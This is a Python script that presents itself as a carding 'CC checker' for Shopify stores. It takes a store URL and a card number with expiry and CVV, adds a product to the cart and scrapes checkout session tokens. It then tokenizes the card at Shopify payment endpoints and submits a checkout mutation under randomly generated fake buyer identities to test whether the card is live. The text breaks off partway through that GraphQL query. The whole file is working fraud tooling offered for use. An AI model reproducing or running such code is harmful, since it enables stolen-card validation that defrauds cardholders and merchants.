import requests, re, base64, random, string, user_agent, time, cloudscraper, urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry  
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import asyncio
#JOİNED FOR MORE CARDİNG TOOL CC CHECKER MORE
#@FTX_COURSE
from time import time
from wsgiref import headers
from fake_useragent import UserAgent
import httpx
from bs4 import BeautifulSoup
import re
import json
import html
from urllib.parse import urlparse
import sys
from faker import Faker
from requests_toolbelt.multipart.encoder import MultipartEncoder
from colorama import Fore, Back, Style, init
init(autoreset=True)
import requests,random,string,bs4,base64
from bs4 import *
import time,uuid,json,re
import user_agent
import requests
import re
import time
import random
import re,json
import string
import base64
from bs4 import BeautifulSoup
import pyfiglet
import os
import webbrowser
import time
import threading
from telebot import types
import requests, random, os, pickle, time, re
from bs4 import BeautifulSoup
from colorama import Fore
O =  '\033[1;31m'
Z =  '\033[1;37m'
F = '\033[1;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m' 
from cfonts import render  
output = render('FTX', colors=['white', 'red'], align='center')
print(output)
print(X+'________________________________________________')
print(Z+'''\nAuto Shopify Captcha Based xD| Dev: @mast4rcard''')
print(X+'________________________________________________')
try:
    sys.stdout.reconfigure(encoding='utf-8')
except AttributeError:
    pass 

def find_between(s, start, end):
    try:
        if start in s and end in s:
            return (s.split(start))[1].split(end)[0]
        return ""
    except:
        return ""

class ShopifyAuto:
    def __init__(self):
        self.user_agent = UserAgent().random
        self.last_price = None
    
    async def tokenize_card(self, session, cc, mon, year, cvv, first, last):
        try:
            url = "https://deposit.us.shopifycs.com/sessions"
            payload = {
                "credit_card": {
                    "number": str(cc).replace(" ", ""),
                    "name": f"{first} {last}",
                    "month": int(mon),
                    "year": int(year),
                    "verification_value": str(cvv)
                }
            }
            headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Origin': 'https://checkout.shopifycs.com',
                'User-Agent': self.user_agent
            }
            r = await session.post(url, json=payload, headers=headers)
            if r.status_code == 200:
                return r.json().get('id')
            else:
                print(f"Tokenize Error!")
                return None
        except Exception as e:
            print(f"❌ Tokenize Not Found!")
            return None

    async def get_random_info(self):        
        us_addresses = [
            {"add1": "123 Main St", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04101"},
            {"add1": "456 Oak Ave", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04102"},
            {"add1": "789 Pine Rd", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04103"},
            {"add1": "321 Elm St", "city": "Bangor", "state": "Maine", "state_short": "ME", "zip": "04401"},
            {"add1": "654 Maple Dr", "city": "Lewiston", "state": "Maine", "state_short": "ME", "zip": "04240"},
            {"add1": "87 Forest Ln", "city": "Augusta", "state": "Maine", "state_short": "ME", "zip": "04330"},
            {"add1": "215 River Rd", "city": "South Portland", "state": "Maine", "state_short": "ME", "zip": "04106"},
            {"add1": "742 Evergreen Terrace", "city": "New York", "state": "New York", "state_short": "NY", "zip": "10001"},
            {"add1": "350 5th Ave", "city": "New York", "state": "New York", "state_short": "NY", "zip": "10118"},
            {"add1": "88-01 Queens Blvd", "city": "Queens", "state": "New York", "state_short": "NY", "zip": "11373"},
            {"add1": "1200 Broadway", "city": "Brooklyn", "state": "New York", "state_short": "NY", "zip": "11221"},
            {"add1": "1600 Pennsylvania Ave", "city": "Los Angeles", "state": "California", "state_short": "CA", "zip": "90001"},
            {"add1": "1 Infinite Loop", "city": "Cupertino", "state": "California", "state_short": "CA", "zip": "95014"},
            {"add1": "350 Mission St", "city": "San Francisco", "state": "California", "state_short": "CA", "zip": "94105"},
            {"add1": "1234 Hollywood Blvd", "city": "Los Angeles", "state": "California", "state_short": "CA", "zip": "90028"},
            {"add1": "701 W 6th St", "city": "Austin", "state": "Texas", "state_short": "TX", "zip": "78701"},
            {"add1": "2200 N Interstate 35", "city": "Austin", "state": "Texas", "state_short": "TX", "zip": "78705"},
            {"add1": "300 Alamo Plaza", "city": "San Antonio", "state": "Texas", "state_short": "TX", "zip": "78205"},
            {"add1": "301 Biscayne Blvd", "city": "Miami", "state": "Florida", "state_short": "FL", "zip": "33132"},
            {"add1": "400 S Orange Ave", "city": "Orlando", "state": "Florida", "state_short": "FL", "zip": "32801"},
            {"add1": "101 E Flagler St", "city": "Miami", "state": "Florida", "state_short": "FL", "zip": "33131"},
            {"add1": "401 N Michigan Ave", "city": "Chicago", "state": "Illinois", "state_short": "IL", "zip": "60611"},
            {"add1": "875 N Michigan Ave", "city": "Chicago", "state": "Illinois", "state_short": "IL", "zip": "60611"},
            {"add1": "1 Monument Cir", "city": "Indianapolis", "state": "Indiana", "state_short": "IN", "zip": "46204"},
            {"add1": "100 N Capitol Ave", "city": "Indianapolis", "state": "Indiana", "state_short": "IN", "zip": "46204"},
        ]
        
        address = random.choice(us_addresses)
        first_name = random.choice([            "John", "Emily", "Alex", "Sarah", "Michael", "Jessica", "David", "Lisa",
            "James", "Olivia", "Robert", "Sophia", "William", "Emma", "Joseph", "Ava",
            "Daniel", "Isabella", "Matthew", "Mia", "Anthony", "Charlotte", "Mark", "Amelia",
            "Paul", "Harper", "Steven", "Evelyn", "Andrew", "Abigail", "Thomas", "Ella",
            "Christopher", "Elizabeth", "Kevin", "Sofia", "Brian", "Avery", "George", "Scarlett",
            "Edward", "Grace", "Ronald", "Chloe", "Jeffrey", "Victoria", "Ryan", "Riley",
            "Jacob", "Aria", "Nicholas", "Lily", "Brandon", "Zoey", "Jonathan", "Layla",
            "Samuel", "Penelope", "Ethan", "Nora", "Benjamin", "Luna", "Logan", "Mila",
            "Alexander", "Aurora", "Jackson", "Hannah", "Lucas", "Addison", "Henry", "Eleanor",
            "Mason", "Natalie", "Noah", "Zoe", "Liam", "Leah", "Caleb", "Madeline",
            "Owen", "Claire", "Dylan", "Audrey", "Jack", "Skylar", "Carter", "Bella",
            "Julian", "Savannah", "Luke", "Brooklyn", "Isaac", "Maya", "Gabriel", "Paisley",
            "Joshua", "Everly", "Wyatt", "Naomi", "Jayden", "Elena", "Grayson", "Stella",
            "Leo", "Violet", "Elias", "Hazel", "Levi", "Willow", "Sebastian", "Lucy",
            "Mateo", "Aaliyah", "Ezra", "Ariana", "Theodore", "Ellie", "Miles", "Peyton",
            "Adam", "Katherine", "Nathan", "Caroline", "Aaron", "Kennedy", "Christian", "Allison",
            "Cameron", "Mackenzie", "Jason", "Autumn", "Justin", "Serenity", "Tyler", "Genesis",
            "Jordan", "Kylie", "Austin", "Kaylee", "Xavier", "Cora", "Dominic", "Ruby",
            "Jaxon", "Sophie", "Roman", "Piper", "Diego", "Faith", "Angel", "Brielle",
            "Jose", "Valentina", "Jeremiah", "Everleigh", "Easton", "Isla", "Colton", "Mariah",
            "Eli", "Jade", "Kayden", "Adalynn", "Bryson", "Lydia", "Zachary", "Raelynn",
            "Ayden", "Melanie", "Lincoln", "Taylor", "Hudson", "Andrea", "Ian", "Jasmine",
            "Tristan", "Parker", "Kingston", "Remi", "Maverick", "Kinsley", "Brayden", "Nova",
            "Gael", "Aurora", "Landon", "Emilia", "Asher", "Delilah", "Santiago", "Everett",
            "Theo", "Athena", "Atlas", "Nova", "River", "Sage", "Phoenix", "Rowan",
            "Kai", "Luna", "Milo", "Freya", "Archer", "Sienna", "Finn", "Ophelia",
            "Bodhi", "Willow", "Caspian", "Iris", "Jett", "Lyric", "Knox", "Marlowe",
            "Reid", "Sloane", "Beckett", "Wren", "Zane", "Indigo", "Cruz", "Nova",
            "Remy", "Aspen", "Silas", "Juniper", "Holden", "Saylor", "Wilder", "Briar",
            "Crew", "Harlow", "Tatum", "Reeve", "Lennox", "Fallon", "Koa", "Echo",
            "Orion", "Lyra", "Maddox", "Nova", "Sterling", "Sage", "Cairo", "Zara"
       ])
        last_name = random.choice([            "Smith", "Johnson", "Williams", "Brown", "Garcia", "Miller", "Davis", "Rodriguez",
            "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor",
            "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson", "White", "Harris",
            "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker", "Young", "Allen",
            "King", "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores", "Green",
            "Adams", "Nelson", "Baker", "Hall", "Rivera", "Campbell", "Mitchell", "Carter",
            "Roberts", "Gomez", "Phillips", "Evans", "Turner", "Diaz", "Parker", "Cruz",
            "Edwards", "Collins", "Reyes", "Stewart", "Morris", "Morales", "Murphy", "Cook",
            "Rogers", "Gutierrez", "Ortiz", "Morgan", "Cooper", "Peterson", "Bailey", "Reed",
            "Kelly", "Howard", "Ramos", "Kim", "Cox", "Ward", "Richardson", "Watson",
            "Brooks", "Chavez", "Wood", "James", "Bennett", "Gray", "Mendoza", "Ruiz",
            "Hughes", "Price", "Alvarez", "Castillo", "Sanders", "Patel", "Myers", "Long",
            "Ross", "Foster", "Jimenez", "Powell", "Jenkins", "Perry", "Russell", "Sullivan",
            "Bell", "Coleman", "Butler", "Fisher", "Vasquez", "Simmons", "Foster", "Gonzales",
            "Bryant", "Alexander", "Russell", "Griffin", "Diaz", "Hayes", "Myers", "Ford",
            "Hamilton", "Graham", "Sullivan", "Wallace", "Woods", "Cole", "West", "Jordan",
            "Owens", "Reynolds", "Fisher", "Ellis", "Harrison", "Gibson", "Mcdonald", "Cruz",
            "Marshall", "Ortiz", "Gomez", "Murray", "Freeman", "Wells", "Webb", "Simpson",
            "Stevens", "Tucker", "Porter", "Hunter", "Hicks", "Crawford", "Henry", "Boyd",
            "Mason", "Morales", "Kennedy", "Warren", "Dixon", "Ramos", "Reyes", "Burns",
            "Gordon", "Shaw", "Holmes", "Rice", "Robertson", "Hunt", "Black", "Daniels",
            "Palmer", "Mills", "Nichols", "Grant", "Knight", "Ferguson", "Rose", "Stone",
            "Hawkins", "Dunn", "Perkins", "Hudson", "Spencer", "Gardner", "Stephens", "Payne",
            "Pierce", "Berry", "Matthews", "Arnold", "Wagner", "Willis", "Ray", "Watkins",
            "Olson", "Carroll", "Duncan", "Snyder", "Hart", "Cunningham", "Bradley", "Lane",
            "Andrews", "Ruiz", "Lawson", "Chapman", "Oliver", "Montgomery", "Rivera", "Schmidt"
        ])
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1, 999)}@gmail.com"
        
        valid_phones = [
            "2025550199", "3105551234", "4155559876", "6175550123", "9718081573", "2125559999", "7735551212", "4085556789",
            "3055550147", "7025552369", "7135558901", "2145556743", "6025553281", "5125559472", "2065554810", "4045557629",
            "5035551934", "6025550456", "6195558721", "7025553098", "8015556742", "9015551289", "9165557530", "9545554617",
            "2105558923", "2815553741", "3035556189", "3125552405", "3175558967", "3235551378", "3305554821", "4075559654",
            "4145557203", "5015553491", "5045551876", "6025555032", "6035559184", "6155552760", "7025556419", "7135550853",
            "7165554297", "7205557538", "7275551642", "7325558075", "8015553926", "8135556480", "8165552714", "9015559357",
            "9045554189", "9165556721", "9185553094", "9255558462", "9375551753", "9415556028", "9495558340", "9515551976",
            "2015554632", "2035559187", "2055553749", "2065558214", "2125555063", "2145557391", "2155552840", "2165556578",
            "2175551925", "2245558406", "2405553751", "2485556293", "2535550847", "2675557319", "2815554962", "3015558634",
            "3035552178", "3055559420", "3125553856", "3135556701", "3145551294", "3175557843", "3215553467", "3235558912",
            "3255554739", "3315556085", "3475559521", "3515552746", "3605558193", "3855553460", "4015557924", "4045551378",
            "4055556842", "4075552297", "4105557651", "4125553089", "4145558436", "4155554762", "4195559217", "4245553648",
            "4255558093", "4345552520", "4405557975", "4435553401", "4695558856", "4705554282", "4785559717", "4805555143",
            "4845550578", "5015556924", "5025552350", "5035557805", "5045553231", "5055558686", "5075554112", "5095559567",
            "5105554993", "5125550428", "5135555883", "5155551319", "5165556774", "5175552200", "5185557665", "5205553110",
            "5305558575", "5405554001", "5415559466", "5515554892", "5595550337", "5615555802", "5625551257", "5635556722",
            "5675552177", "5715557642", "5735553097", "5745558562", "5805554017", "5855559492", "5865554947", "6015550402",
            "6025555877", "6035551332", "6055556807", "6095552262", "6105557737", "6125553192", "6145558667", "6155554122",
            "6165559597", "6195555052", "6235550527", "6265556002", "6305551467", "6315556942", "6365552407", "6415557882",
            "6465553347", "6515558822", "6575554287", "6605559762", "6615555227", "6785550702", "6825556177", "7015551642",
            "7025557117", "7035552582", "7075558057", "7085553522", "7125558997", "7135554462", "7145559937", "7155555402",
            "7165550877", "7175556352", "7185551827", "7195557302", "7205552777", "7245558252", "7275553727", "7315559202",
            "7325554677", "7345550152", "7375555627", "7405551102", "7545556577", "7575552052", "7605557527", "7635553002",
            "7655558477", "7705553952", "7725559427", "7755554902", "7815550377", "7855555852", "8015551327", "8025556802"
        ]
        phone = random.choice(valid_phones)        
        return {
            "fname": first_name,
            "lname": last_name,
            "email": email,
            "phone": phone,
            "add1": address["add1"],
            "city": address["city"],
            "state": address["state"],
            "state_short": address["state_short"],
            "zip": address["zip"]
        }
async def main():
    async with httpx.AsyncClient(follow_redirects=True, timeout=30.0) as session:
        try:
            site = input('Send Shopi Url Ex(https://site.com): ').strip().rstrip('/')
            site_url = site 
            
            card_input = input('Cc Number: (cc|mm|yy|cvv): ').strip()
            try:
                cc, mon, year, cvv = card_input.split('|')
            except ValueError:
                print("❌ Invalid card format.")
                cc, mon, year, cvv = "0000000000000000", "01", "25", "123"            
            shop = ShopifyAuto()
            
            product_header = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.6',
                'user-agent': shop.user_agent,
            }

            print("visiting the product page to get the variant id and cookies")
            try:
                product_response = await session.get(site + '/products.json', headers=product_header)
                products_data = product_response.json()
                product = products_data['products'][0]
                product_id = product['id']
                product_handle = product['handle']
                variant_id = product['variants'][0]['id']
                price = product['variants'][0]['price']                
                print(f" ✅ Product Name: {product['title']}")
                print(f" ✅ Product ID: {product_id}")
                print(f" ✅ Variant ID: {variant_id}")
                print(f" ✅ Price: ${price}")
            except Exception as e:
                print(f"❌ Failed Product Change Site Baby")
                return
            product_page_response = await session.get(f"{site}/products/{product_handle}", headers=product_header)
            product_header.update({'user-agent': UserAgent().random}) 
            await session.get(site + '/cart.js', headers=product_header)
            add_data = {
                'id': str(variant_id),
                'quantity': '1',
                'form_type': 'product',
            }
            print("Adding İtem...")
            response = await session.post(site + '/cart/add.js', headers=product_header, data=add_data)            
            if response.status_code == 200:
                print("✅ Item added!")               
                cart_response = await session.get(f"{site}/cart.js", headers=product_header)
                cart_data = cart_response.json()
                token = cart_data['token']
                print(f"Cart token: {token}")
                print(f"Items in cart: {cart_data['item_count']}")                             
                checkout_headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': site,
                    'referer': f"{site}/cart",
                    'upgrade-insecure-requests': '1',
                    'user-agent': product_header['user-agent'],
                }
                
                await session.get(f"{site}/checkout", headers=checkout_headers) 
                
                checkout_data = {
                    'checkout': '',  
                    'updates[]': '1', 
                }
                
                checkout_response = await session.post(f"{site}/cart", headers=checkout_headers, data=checkout_data)                
                print(f"   Final URL after redirect: {checkout_response.url}")

                response_text2 = checkout_response.text

                x_checkout_one_session_token = re.search(
                    r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', 
                    response_text2
                )

                session_token = None
                if x_checkout_one_session_token:
                    session_token = x_checkout_one_session_token.group(1)
                    print(f" ✅Session token: {session_token}")
                queue_token = find_between(response_text2, 'queueToken&quot;:&quot;', '&quot;')
                print(f" ✅queue_token={queue_token}")
                stable_id = find_between(response_text2, 'stableId&quot;:&quot;', '&quot;')
                print(f" ✅stable_id={stable_id}")
                paymentMethodIdentifier = find_between(response_text2, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
                print(f" ✅paymentMethodIdentifier={paymentMethodIdentifier}")
                await asyncio.sleep(1)
                print("Create Order...")
                random_info = await shop.get_random_info()
                fname = random_info["fname"]
                lname = random_info["lname"]
                email = random_info["email"]
                phone = random_info["phone"]
                add1 = random_info["add1"]
                city = random_info["city"]
                state_short = random_info["state_short"]
                zip_code = str(random_info["zip"])
                session_endpoints = [
                    "https://deposit.us.shopifycs.com/sessions",
                    "https://checkout.pci.shopifyinc.com/sessions",
                    "https://checkout.shopifycs.com/sessions"
                ]                        
                session_created = False
                sessionid = None
                        
                for endpoint in session_endpoints:
                    try:
                        headers = {
                            'authority': urlparse(endpoint).netloc,
                            'accept': 'application/json',
                            'content-type': 'application/json',
                            'origin': 'https://checkout.shopifycs.com',
                            'referer': 'https://checkout.shopifycs.com/',
                            'user-agent': shop.user_agent,
                        }

                        json_data = {  
                            'credit_card': {
                                'number': cc,
                                'month': mon,
                                'year': year,
                                'verification_value': cvv,
                                'name': fname + ' ' + lname,
                            },
                            'payment_session_scope': urlparse(site_url).netloc,
                        }

                        session_response = await session.post(endpoint, headers=headers, json=json_data)
                        print(f" Payment Session Response Status from {endpoint}: {session_response.status_code}")
                                
                        if session_response.status_code == 200:
                            session_data = session_response.json()
                            if "id" in session_data:
                                sessionid = session_data["id"]
                                session_created = True
                                print(f"✅ Payment session created at {endpoint}: {sessionid}")
                                break
                        else:
                            print(f"⚠️ {endpoint} returned {session_response.status_code}")
                    except Exception as e:
                        print(f"⚠️ Error trying {endpoint}: {e}")

                if session_created:
                    await asyncio.sleep(1)
                    print("\n Submitting GraphQL payment...")
                    
                    graphql_url = f"{site_url}/checkouts/unstable/graphql"
                    
                    graphql_headers = {
                        'authority': urlparse(site_url).netloc,
                        'accept': 'application/json',
                        'accept-language': 'en-US,en;q=0.9',
                        'content-type': 'application/json',
                        'origin': site_url,
                        'referer': f"{site_url}/",
                        'user-agent': shop.user_agent,
                        'x-checkout-one-session-token': session_token,
                        'x-checkout-web-deploy-stage': 'production',
                        'x-checkout-web-server-handling': 'fast',
                        'x-checkout-web-source-id': token,
                    }

                    random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012X}"

                if session_created:
                    await asyncio.sleep(1)
                    
                    graphql_url = f"{site_url}/checkouts/unstable/graphql"
                    

                    tokens = {
                        'x_checkout_one_session_token': session_token,
                        'queue_token': queue_token,
                        'stable_id': stable_id,
                        'paymentMethodIdentifier': paymentMethodIdentifier
                    }


                    for attempt in range(2):                       
                        graphql_headers = {
                            'authority': urlparse(site_url).netloc,
                            'accept': 'application/json',
                            'accept-language': 'en-US,en;q=0.9',
                            'content-type': 'application/json',
                            'origin': site_url,
                            'referer': f"{site_url}/",
                            'user-agent': shop.user_agent,
                            'x-checkout-one-session-token': session_token,
                            'x-checkout-web-deploy-stage': 'production',
                            'x-checkout-web-server-handling': 'fast',
                            'x-checkout-web-source-id': token,
                        }

                        random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012X}"

                        graphql_payload = {
                            'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}analytics{checkoutCompletedEventId __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId customerOrdersCount eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsMarketing acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsMarketing acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name deposit __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items 